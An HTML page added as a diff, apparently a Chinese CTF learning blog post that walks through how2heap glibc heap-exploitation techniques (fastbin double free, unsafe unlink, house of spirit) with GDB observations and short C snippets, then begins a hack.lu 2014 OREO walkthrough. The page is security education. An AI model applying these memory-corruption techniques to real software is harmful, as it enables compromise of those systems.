@@ -1,0 +1,988 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Modifier">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="还是好好打基础···">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap深入浅出学习堆利用(一)">
+<meta property="og:url" content="https://shmodifier.github.io/2024/03/02/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/index.html">
+<meta property="og:site_name" content="Modifier">
+<meta property="og:description" content="还是好好打基础···">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shmodifier.github.io/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
+<meta property="article:published_time" content="2024-03-02T11:34:54.000Z">
+<meta property="article:modified_time" content="2024-03-02T11:56:51.050Z">
+<meta property="article:author" content="Modifier">
+<meta property="article:tag" content="Knowledge">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://shmodifier.github.io/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
+  
+  
+  
+  <title>how2heap深入浅出学习堆利用(一) - Modifier</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"shmodifier.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":false,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Have a nice day!</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="how2heap深入浅出学习堆利用(一)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-02 19:34" pubdate>
+          2024年3月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          138 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">how2heap深入浅出学习堆利用(一)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>还是好好打基础···</p>
+<span id="more"></span>
+
+<p>以前都是直接拿题来，碰到知识点就去学。然后碰一道题一道题不会，所以就来系统的学一下 how2heap</p>
+<blockquote>
+<ul>
+<li>这个实验如果要做的话建议先看一下 malloc 的源码，我就是一开始根本不懂每一步的原理，分析完源码以后豁然开朗了🍿</li>
+<li>我用来编译实验用例的代码是<a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/how2heap.html">【PWN】how2heap | 狼组安全团队公开知识库 (wgpsec.org)</a></li>
+</ul>
+</blockquote>
+<h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><blockquote>
+<p>我是直接从这一部分开始的，前两个小节讲的就是分配规则就跳过啦</p>
+</blockquote>
+<p><strong>原理：</strong> fastbins 的 double-free 攻击</p>
+<p><strong>知识点✨：</strong></p>
+<ul>
+<li>fast bins 为单链表存储，并采用后进先出（LIFO）的原则：后 free 的 chunk 会被添加到链表的尾部，也就是后 free 的 chunk 永远在先 free 的 chunk 的后面。后续 malloc 时会先取出链表尾后面的堆块，也就是最后放进去的那个。</li>
+<li>fastbin 的 double free 检查是：如果要 free 掉的这个 chunk（我们记作chunk-A） 属于 fast bin，就会检查链表中当前最后一个地址是不是即将要释放的 chunk-A 的地址，如果不是，就会执行free chunk的操作，将 chunk-A 的地址链接到链表末端。</li>
+<li>我们只要保证 fast bins 链表最后一个地址不指向 chunk-A ，就可以多次 free chunk-A，从而实现 double free。</li>
+</ul>
+<p><strong>GDB 调试</strong></p>
+<p>实例做了下面的几个操作：</p>
+<ul>
+<li>malloc 三个堆块（我们暂时记为1，2，3）</li>
+<li>free 1</li>
+<li>free 2</li>
+<li>再次 free 1</li>
+<li>再次 malloc 三个堆块</li>
+</ul>
+<p>我们先让程序分配好三个堆块</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_heap1.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着 free 掉第一个堆块，它会进入到 fastbin 中</p>
+<p>这时我们再次 <code>free (a)</code> 一次，程序就会报错，因为它已经被释放，这个指针指向 free 链表的第一个位置。</p>
+<p>那我们该如何去绕过这个检测呢？接下来程序 <code>free(b)</code> ，这时 free 链表第一就是 b ，我们就可以再次 <code>free (a)</code> 了</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_free1.png" srcset="/img/loading.gif" lazyload alt="地址不一样了因为我发现我原本用的是2.31换了一下"></p>
+<p>free(a) 之后 fastbin 链表就变成了一个“环形”，这时 free 链表认为它有三块内存 <code>[0x602000, 0x602020, 0x602000]</code> </p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_free2.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样的话我们再次 malloc 相同大小的堆块，这个 <code>0x602020</code>  就会被分配两次。我们向里面填充数据可以看到0x4444444444444444 被改成了 0x4646464646464646，是因为后来申请的 f 跟 d 指向同一块内存区域。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_heap2.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>总结：</strong></p>
+<p>fastbins 的 double-free 攻击，可以泄露出一块已经被分配的内存指针。</p>
+<p>由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk 。所以在两次 free 之间，我们只需要增加一次对其他 chunk 的 free 过程，就可以绕过检查顺利执行，这样同一个地址就会在 fast bin 链表中出现两次。随后我们再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</p>
+<h1 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h1><p><strong>原理：</strong> 这个程序展示了怎样通过修改 <code>fd</code> 指针，将其指向一个伪造的 free chunk，并在伪造的地址处 malloc 出一个 chunk</p>
+<p>前面的部分和上一个实验一样，先 malloc 三次然后 free 三次，这时 fastbins 形成了一个循环的指针。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_list.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时我们再 malloc 两次，fastbins 中还剩原本指向 chunk a 的指针。而前两次 malloc 我们已经申请到了同样指向 <code>a</code> 的指针 <code>d</code></p>
+<p>这时，我们查看其内存分布发现它的 fd 指针指向 <code>0x603020</code></p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_fd.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来我们修改它的 fd 指针，覆盖 d 的前八个字节（之前有说过，chunk 被使用时，它的 <code>fd</code> 域也会被用来存储信息） 。</p>
+<p><code>stack_var = 0x20; d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code> </p>
+<p>需要注意，我们定义这个 <code>stack_var</code> ，是为了取栈上的地址，<code>栈上第一个参数的地址-8</code> 就是栈的基址。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_fd2.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个时候 fd 就被修改为栈上的地址。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_heap2.png" srcset="/img/loading.gif" lazyload></p>
+<p>又因为 fastbin 中这时还有一个 a 的地址，所以我们接下来再进行两次 malloc，第一次 malloc 把 double free 的 a 申请掉，第二次 malloc 就会去申请这个栈上的地址，我们将这个栈上的“堆块”记为 <code>S</code> 。</p>
+<p>接下来程序向 S 写入数据，可以看出它已经被我们控制了 </p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_stack1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_stack2.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><p><strong>原理：</strong>使用 <code>malloc_consolidate</code> 机制来绕开 fastbin 对 double free 的检测。</p>
+<p><strong>知识点✨：</strong></p>
+<ul>
+<li><code>malloc_consolidate()</code> 函数用于将 fast bins 中的 chunk 与其物理相邻的 chunk 合并，并加入 unsorted bin 中。分为高地址（除top chunk）合并和低地址合并。合并后将当前的 chunk 或者 next_chunk 从其所在 bin 中 unlink 出来。</li>
+</ul>
+<p><strong>GDB 调试</strong></p>
+<p>我们先申请两个 fastbin 大小的 chunk a 和 b，接着 free a。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dupdup_list.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们再申请一个 largebin 大小的 chunk ，这时程序会调用 <code>malloc_consolidate()</code>，将刚刚 free 的 a 放到  unsorted bin 中，然后经过种种查找遍历（原理详见 malloc 源码分析）再丢进 smallbin 里面。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dupdup_smallbin.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时 fastbin 链表中的表头就不是 a 啦，我们就可以再一次 free a。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dupdup_doublefree.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样之后我们就可以 malloc 两个指向同一地址的 chunk 了。</p>
+<h1 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h1><p><strong>原理：</strong>实现分配的内存里伪造 fake chunk，通过修改 P 的 prev_inuse 位来改变 fake chunk 的状态。free P 时调用 <code>unlink</code> 来合并 P 和 fake chunk，P 的指针会变为 <code>P-0x18</code>。</p>
+<p>unlink 通常结合堆溢出漏洞进行利用。通过堆溢出，我们可以申请两个连续的 chunk，通过修改前一个 chunk 的内容溢出到下一个 chunk，实现修改第二个 chunk 的 fd, bk 指针的目的。</p>
+<p><strong>涉及到的知识点✨：</strong></p>
+<ul>
+<li><p>inuse chunk 和 free chunk</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/inuse_and_free.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>unlink ：当我们调用 malloc 去从一块大的堆块中切割小堆块时会调用到 <code>unlink</code></p>
+<p>有一个保护检查机制，在解链操作之前，针对堆块 P 自身的 fd 和 bk 检查链表的完整性，即判断堆块 P 的前一块 bk 的指针以及后一块 fd 的指针是否指向 P，后一块堆块的 prev_size 是否等于自身的 size。</p>
+</li>
+</ul>
+<p>首先申请两个 malloc ，我们看内存中的分布如下</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/safechunk_heap1.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们要实现控制的是 chunk 1，我们利用的指针是 chunk 0。</p>
+<p>我们把这个 fake chunk 记为 P 。 <code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code>，接下来我们要处理这个检查。这个检查的 fd&#x2F;bk 指针都是通过与 chunk 头部的相对地址来查找的，所以我们可以利用全局指针 chunk0_ptr 构造 fake chunk 来绕过它。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)<br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure>
+
+<p>我们修改 chunk0 的信息，在 chunk0 里面伪造一个 fake chunk。让 fake chunk 的 fd 指针指向 &amp;chunk0_ptr，让 bk 指针指向 &amp;chunk0_ptr，使得 <code>P-&gt;fd-&gt;bk=P,P-&gt;bk-&gt;fd=P</code> 。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/unsafe_fakechunk.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时我们查看 chunk0 的内存区域，我们就成功地伪造了一个 fd 指针和 bk 指针。</p>
+<p>接下来只需要有一个溢出的漏洞，我们就可以改变 chunk1 的 PREV_SIZE 位大小，并把 PREV_INUSE 标志位为 0。在我们的程序中，如果正常的  <code>free(chunk0)</code>，那么 chunk1 中的 PREV_SIZE 位是 0x90 ，我们将它改为伪造的 fake chunk 的大小 0x80，并把其标记为空闲。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/unsafe_fakechunk2.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>原本 size 位的 91中的“1”实际上是 PREV_inuse 位</p>
+</blockquote>
+<p>到目前为止，我们的 fake_chunk 里的指针情况如下：</p>
+<ul>
+<li>fd 指针指向 0x602058 </li>
+<li>bk 指针指向 0x602060 </li>
+<li>0x602058 的 bk 指向 0x602070</li>
+<li>0x602060 的 fd 指向 0x602070</li>
+</ul>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/unsafe_fakechunk3.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们保证了一个 fake chunk 与栈上区域的完整的双向链表，</p>
+<p>这下我们只要 <code>free(1)</code> ，因为 chunk1 不属于 fastbin，这时我们原本在 chunk0 中的 fake chunk 就会与 chunk1 合并。合并过程调用 <code>unlink()</code> 函数，会发生下面的几个流程，我们分别将他们直接看做具体的内存位置来看：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">FD=P-&gt;fd       <span class="hljs-comment">//     FD = P-&gt;fd = &amp;P - 24</span><br>BK=P-&gt;bk       <span class="hljs-comment">//     BK = P-&gt;bk = &amp;P - 16</span><br>FD-&gt;bk = BK    <span class="hljs-comment">//     FD-&gt;bk = *(&amp;P - 24 + 24) = P</span><br>BK-&gt;fd = FD    <span class="hljs-comment">//     FD-&gt;fd = *(&amp;P - 16 + 16) = P</span><br></code></pre></td></tr></table></figure>
+
+<p>最后实现的结果是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">FD-&gt;bk = P = BK = &amp;P - <span class="hljs-number">16</span><br>BK-&gt;fd = P = FD = &amp;P - <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p>这个时候我们就可以发现，chunk0_ptr 和 chunk0_ptr[3] (fake chunk) 指向的是同一个地址。这样我们就可以利用 chunk0_ptr 覆盖自身来指向任意位置了。</p>
+<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><blockquote>
+<p>到这里终于是看到一个 fastbin 的常见的攻击方法了😀</p>
+</blockquote>
+<p><strong>原理：</strong></p>
+<p>House_of_spirit 是利用堆的 fast bin 机制来辅助栈溢出的。如果栈溢出的长度无法覆盖返回地址，但可以覆盖栈上的一个即将被 free 的堆指针。此时就可以利用溢出来将这个指针改写为栈上的地址并在相应位置构造一个 fast bin 块的元数据。接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于fast bin的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。</p>
+<p><strong>House_of_spirit 利用的第一步是控制修改传给 free 函数的指针，将其指向一个 fake chunk， fake chunk 的伪造是关键。</strong></p>
+<p>在这个实验中，我们的 fakechunk 是构建在栈上的有10 个元素的长整型数组，也就就是长度为 80 。这个区域里我们预计设置两个 fake chunk。</p>
+<p>在准备阶段，我们可以看到它就是正常的一个栈上的结构：</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/houseofsprit_fakechunk_init.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来我们构造 fake chunk。</p>
+<p>因为我们还没有释放这个 fake chunk 所以只需要设置 size 。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/houseofsprit_fakechunk.png" srcset="/img/loading.gif" lazyload></p>
+<p>在开始的时候我们申请了一个chunk *<em>a</em>，我们现在假设栈溢出修改了 <em>*a</em> 指向 fake chunk1 ，现在我们 free 掉它.</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/houseofsprit_free.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时我们的 fake chunk 就进入了 bins 中。</p>
+<p>当我们再次申请相同大小的堆块时，程序就会把这块内存返回给我们，我们就实现了对这块地址的任意写操作。</p>
+<blockquote>
+<p>对于fakechunk的构造，有以下几点需要注意：</p>
+<ul>
+<li><code>IS_MMAPPED</code> 位和 <code>NON_MAIN_ARENA</code> 位都要为零</li>
+<li>大小要在 32~128 字节之间</li>
+</ul>
+</blockquote>
+<h3 id="🗡️真题实战-hack-lu-CTF-2014-OREO"><a href="#🗡️真题实战-hack-lu-CTF-2014-OREO" class="headerlink" title="🗡️真题实战 hack.lu CTF 2014-OREO"></a>🗡️真题实战 hack.lu CTF 2014-OREO</h3><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo/oreo">获取题目点这里！</a></p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_sprit_checksec.png" srcset="/img/loading.gif" lazyload></p>
+<p>程序菜单所提供的功能，分别对应：</p>
+<ul>
+<li><code>add new rifle</code> ：malloc 一个新的堆块</li>
+<li><code>show added rifle</code> ：输出堆块存储的信息</li>
+<li><code>order selected rifle</code> ：free 掉在此之前的所有堆块</li>
+<li><code>leave a message</code>：根据 bss 段上记录的一个地址，向这个地址进行写入操作。</li>
+</ul>
+<h5 id="泄露基地址"><a href="#泄露基地址" class="headerlink" title="泄露基地址"></a>泄露基地址</h5><p>我们在 <code>add new rifle</code> 功能函数中可以看出用于存储 rifle 的结构体大致是如下的结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> description[<span class="hljs-number">26</span>];<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">26</span>];<br>    node *prev;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是这两个部分都是读取了 56 个字节，可以溢出。</p>
+<p>在 <code>show add refle</code> 功能函数中我们可以看出，向用户输出信息是根据每个结点的指针组成的链状结构一一访问。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/orce-show.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以我们可以利用这两个函数，在填写 description 时修改第 13 位的 <code>prev</code> 指针指向 puts_got ，再通过 <code>show add refle</code> 泄露地址，从而计算基地址。</p>
+<h5 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h5><p>再回忆一下下完成 House Of Spirit 的条件：</p>
+<ul>
+<li><code>IS_MMAPPED</code> 位和 <code>NON_MAIN_ARENA</code> 位都要为零</li>
+<li>大小在 <code>2 * SIZE_SZ ~ av-&gt;system_mem</code> 之间</li>
+<li>地址对齐</li>
+</ul>
+<p>再结合本题情况完成对应条件构造：</p>
+<ul>
+<li><p>在 <code>show current stats</code> 功能中用到的三个变量在 bss 段写入数据，并且存在一个指针指向 <code>0804A2C0</code> 。可以在此处构造 fake chunk</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/orce-bss.png" srcset="/img/loading.gif" lazyload></p>
+</li>
